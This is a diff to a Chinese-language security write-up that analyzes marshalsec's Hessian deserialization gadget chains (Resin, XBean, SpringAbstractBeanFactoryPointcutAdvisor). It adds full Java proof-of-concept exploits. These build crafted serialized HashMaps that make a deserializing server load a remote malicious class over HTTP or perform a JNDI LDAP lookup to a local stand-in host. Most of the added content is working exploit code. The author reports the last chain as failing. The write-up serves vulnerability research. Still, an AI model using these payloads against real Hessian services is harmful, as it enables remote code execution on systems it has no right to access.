@@ -407,6 +407,359 @@ public class RomeGadget {
 
 <div align=center><img src="./images/6.png"></div>
 
+## Resin
+### 构造分析
+ - 先来看看`marshalsec`中给出的`Resin.java`, 先反射调用`javax.naming.spi.ContinuationDirContext`, 接着实例化该对象, 分别传入`CannotProceedException`和`Hashtable`. 接着创建一个`CannotProceedException`对象, 设置其`cause`、`stackTrace`均为`null`. 接着创建一个`Reference`对象, 并获取远程的恶意类. 最后调用`UtilFactory#makeToStringTriggerStable`方法.
+
+```java
+public interface Resin extends Gadget {
+
+    @Args ( minArgs = 2, args = {
+        "codebase", "class"
+    }, defaultArgs = {
+        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    } )
+    default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception {
+
+        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
+        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
+        ccCons.setAccessible(true);
+        CannotProceedException cpe = new CannotProceedException();
+        Reflections.setFieldValue(cpe, "cause", null);
+        Reflections.setFieldValue(cpe, "stackTrace", null);
+
+        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ]));
+
+        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
+        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
+        QName qName = new QName(ctx, "foo", "bar");
+        return uf.makeToStringTriggerStable(qName);
+    }
+}
+```
+
+ - 跟进`UtilFactory#makeToStringTriggerStable`方法, 继续调用`ToStringUtil#makeToStringTrigger`方法. 先调用`unhash`方法来计算`qName.hashCode`, 接着创建一个`XString`对象, 最后调用`JDKUtil#makeMap`方法, 与`RomeGadget`后面的分析一样.
+
+```java
+default Object makeToStringTriggerStable ( Object obj ) throws Exception {
+    return ToStringUtil.makeToStringTrigger(obj);
+}
+```
+
+```java
+public static Object makeToStringTrigger ( Object o ) throws Exception {
+    String unhash = unhash(o.hashCode());
+    XString xString = new XString(unhash);
+    return JDKUtil.makeMap(o, xString);
+}
+```
+
+### POC
+
+```java
+package org.h3rmesk1t.Hessian;
+
+import com.caucho.hessian.io.*;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import sun.reflect.ReflectionFactory;
+import com.caucho.naming.QName;
+import javax.naming.CannotProceedException;
+import javax.naming.Reference;
+import javax.naming.directory.DirContext;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Hashtable;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/12 12:40 上午
+ */
+public class ResinGadget {
+
+    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static String unhash ( int hash ) {
+        int target = hash;
+        StringBuilder answer = new StringBuilder();
+        if ( target < 0 ) {
+            // String with hash of Integer.MIN_VALUE, 0x80000000
+            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");
+
+            if ( target == Integer.MIN_VALUE )
+                return answer.toString();
+            // Find target without sign bit set
+            target = target & Integer.MAX_VALUE;
+        }
+
+        unhash0(answer, target);
+        return answer.toString();
+    }
+
+    private static void unhash0 ( StringBuilder partial, int target ) {
+        int div = target / 31;
+        int rem = target % 31;
+
+        if ( div <= Character.MAX_VALUE ) {
+            if ( div != 0 )
+                partial.append((char) div);
+            partial.append((char) rem);
+        }
+        else {
+            unhash0(partial, div);
+            partial.append((char) rem);
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        String remoteUrl = "http://127.0.0.1:8180/";
+        String remoteClass = "ExecTemplateJDK8";
+        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
+        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
+        ccCons.setAccessible(true);
+        CannotProceedException cpe = new CannotProceedException();
+        setFieldValue(cpe, "cause", null);
+        setFieldValue(cpe, "stackTrace", null);
+
+        cpe.setResolvedObj(new Reference("Foo", remoteClass, remoteUrl));
+
+        setFieldValue(cpe, "suppressedExceptions", null);
+        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
+        QName qName = new QName(ctx, "foo", "bar");
+
+        String unhash = unhash(qName.hashCode());
+        XString xString = new XString(unhash);
+
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        setFieldValue(hashMap, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, qName, qName, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, xString, xString, null));
+        setFieldValue(hashMap, "table", tbl);
+
+        // Hessian 序列化数据
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
+        serializableFactory.setAllowNonSerializable(true);
+        hessianOutput.setSerializerFactory(serializableFactory);
+        hessianOutput.writeObject(hashMap);
+        byte[] serializedData = byteArrayOutputStream.toByteArray();
+        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));
+
+        // Hessian 反序列化数据
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+```
+
+<div align=center><img src="./images/8.png"></div>
+
+## XBean
+### 构造分析
+ - 和`ResinGadget`一样, 先创建一个`ReadOnlyBinding`对象来绑定远程的恶意类, 接着调用`MarshallerBase#makeToStringTriggerUnstable`方法.
+
+```java
+public interface XBean extends Gadget {
+
+    @Args ( minArgs = 2, args = {
+        "codebase", "classname"
+    }, defaultArgs = {
+        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    } )
+    default Object makeXBean ( UtilFactory uf, String[] args ) throws Exception {
+        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
+        Reference ref = new Reference("foo", args[ 1 ], args[ 0 ]);
+        ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
+        return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
+    }
+
+}
+```
+
+ - 跟进`MarshallerBase#makeToStringTriggerUnstable`方法, 进一步调用`ToStringUtil#makeSpringAOPToStringTrigger`方法. 这里会调用`HotSwappableTargetSource`来创建两个对象, 最后调用`JDKUtil#makeMap`方法, 和`RomeGadget`后面的分析一样.
+
+```java
+@Override
+public Object makeToStringTriggerUnstable ( Object obj ) throws Exception {
+    return ToStringUtil.makeSpringAOPToStringTrigger(obj);
+}
+```
+
+```java
+public static Object makeSpringAOPToStringTrigger ( Object o ) throws Exception {
+    return makeToStringTrigger(o, x -> {
+        return new HotSwappableTargetSource(x);
+    });
+}
+```
+
+```java
+public static Object makeToStringTrigger ( Object o, Function<Object, Object> wrap ) throws Exception {
+    String unhash = unhash(o.hashCode());
+    XString xString = new XString(unhash);
+    return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
+}
+```
+
+### POC
+
+```java
+package org.h3rmesk1t.Hessian;
+
+import com.caucho.hessian.io.HessianInput;
+import com.caucho.hessian.io.HessianOutput;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import org.apache.xbean.naming.context.ContextUtil;
+import org.apache.xbean.naming.context.WritableContext;
+import org.springframework.aop.target.HotSwappableTargetSource;
+import sun.reflect.ReflectionFactory;
+
+import javax.naming.Context;
+import javax.naming.Reference;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/12 1:06 上午
+ */
+public class XBeanGadget {
+
+    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
+            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
+    }
+
+    @SuppressWarnings ( {
+            "unchecked"
+    } )
+    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
+                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
+        objCons.setAccessible(true);
+        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
+        sc.setAccessible(true);
+        return (T) sc.newInstance(consArgs);
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        String remoteUrl = "http://127.0.0.1:8180/";
+        String remoteClass = "ExecTemplateJDK8";
+
+        Context ctx = createWithoutConstructor(WritableContext.class);
+        Reference ref = new Reference("foo", remoteClass, remoteUrl);
+        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);
+
+        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(binding);
+        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("h3rmesk1t"));
+
+
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        setFieldValue(hashMap, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, hotSwappableTargetSource1, hotSwappableTargetSource1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, hotSwappableTargetSource2, hotSwappableTargetSource2, null));
+        setFieldValue(hashMap, "table", tbl);
+
+        // Hessian 序列化数据
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
+        serializableFactory.setAllowNonSerializable(true);
+        hessianOutput.setSerializerFactory(serializableFactory);
+        hessianOutput.writeObject(hashMap);
+        byte[] serializedData = byteArrayOutputStream.toByteArray();
+        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));
+
+        // Hessian 反序列化数据
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+```
+
+<div align=center><img src="./images/9.png"></div>
+
+
 ## SpringPartiallyComparableAdvisorHolder
 ### 构造分析
  - 先来看看`marshalsec`中给出的`SpringPartiallyComparableAdvisorHolder.java`, 这里将传入的`jndiUrl`传入`SpringUtil#makeJNDITrigger`方法.
@@ -473,7 +826,7 @@ public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, B
 }
 ```
 
- - 接着跟进`UtilFactory#makeToStringTriggerUnstable`, 继续会调用`ToStringUtil#makeToStringTrigger`方法. 然后会调用到`JDKUtil#makeMap`方法, 这里与`RomeGadget`后面的分析一样了.
+ - 接着跟进`UtilFactory#makeToStringTriggerUnstable`, 继续会调用`ToStringUtil#makeToStringTrigger`方法. 然后会调用到`JDKUtil#makeMap`方法, 这里与`RomeGadget`后面的分析一样.
 
 ```java
 Object makeToStringTriggerUnstable ( Object obj ) throws Exception;
@@ -632,7 +985,138 @@ public class SpringPartiallyComparableAdvisorHolderGadget {
 
 <div align=center><img src="./images/6.png"></div>
 
+## SpringAbstractBeanFactoryPointcutAdvisor
+### 构造分析
+ - 先来看看`marshalsec`中给出的`SpringAbstractBeanFactoryPointcutAdvisor.java`, 这里和`SpringPartiallyComparableAdvisorHolderGadget`一样, 还是先将传入的`jndiUrl`传入`SpringUtil#makeJNDITrigger`方法, 接着会调用`SpringUtil#makeBeanFactoryTriggerBFPA`方法.
 
+```java
+public interface SpringAbstractBeanFactoryPointcutAdvisor extends Gadget {
+
+    @Primary
+    @Args ( minArgs = 1, args = {
+        "jndiUrl"
+    }, defaultArgs = {
+        MarshallerBase.defaultJNDIUrl
+    } )
+    default Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
+        String jndiUrl = args[ 0 ];
+        return SpringUtil.makeBeanFactoryTriggerBFPA(uf, jndiUrl, SpringUtil.makeJNDITrigger(jndiUrl));
+    }
+}
+```
+
+ - 跟进`SpringUtil#makeBeanFactoryTriggerBFPA`方法, 先创建一个`DefaultBeanFactoryPointcutAdvisor`实例, 接着调用该实例的`setBeanFactory`和`setAdviceBeanName`方法, 最后调用`UtilFactory#makeEqualsTrigger`方法.
+
+```java
+public static Object makeBeanFactoryTriggerBFPA ( UtilFactory uf, String name, BeanFactory bf ) throws Exception {
+    DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
+    pcadv.setBeanFactory(bf);
+    pcadv.setAdviceBeanName(name);
+    return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
+}
+```
+
+ - 跟进`UtilFactory#makeEqualsTrigger`方法, 接着调用`JDKUtil#makeMap`, 然后又是和`RomeGadget`一样的处理过程了.
+
+```java
+default Object makeEqualsTrigger ( Object tgt, Object sameHash ) throws Exception {
+    return JDKUtil.makeMap(tgt, sameHash);
+}
+```
+
+### POC
+```java
+package org.h3rmesk1t.Hessian;
+
+import com.caucho.hessian.io.*;
+import org.apache.commons.logging.impl.NoOpLog;
+import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
+import org.springframework.jndi.support.SimpleJndiBeanFactory;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/11 11:34 下午
+ */
+public class SpringAbstractBeanFactoryPointcutAdvisorGadget {
+
+    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
+        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
+        bf.setShareableResources(jndiUrl);
+        setFieldValue(bf, "logger", new NoOpLog());
+        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
+
+        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
+        pcadv.setBeanFactory(bf);
+        pcadv.setAdviceBeanName(jndiUrl);
+
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        setFieldValue(hashMap, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, pcadv, pcadv, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, new DefaultBeanFactoryPointcutAdvisor(), new DefaultBeanFactoryPointcutAdvisor(), null));
+        setFieldValue(hashMap, "table", tbl);
+
+        // Hessian 序列化数据
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
+        serializableFactory.setAllowNonSerializable(true);
+        hessianOutput.setSerializerFactory(serializableFactory);
+        hessianOutput.writeObject(hashMap);
+        byte[] serializedData = byteArrayOutputStream.toByteArray();
+        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));
+
+        // Hessian 反序列化数据
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+```
+
+不知道为啥打不通, 排查了半天还是这个呆逼报错`Exception in thread "main" java.lang.IllegalStateException: 'adviceBeanName' must be specified`, 先占个坑...∂
 
 # 参考
  - [Hessian 反序列化及相关利用链](https://paper.seebug.org/1131/)
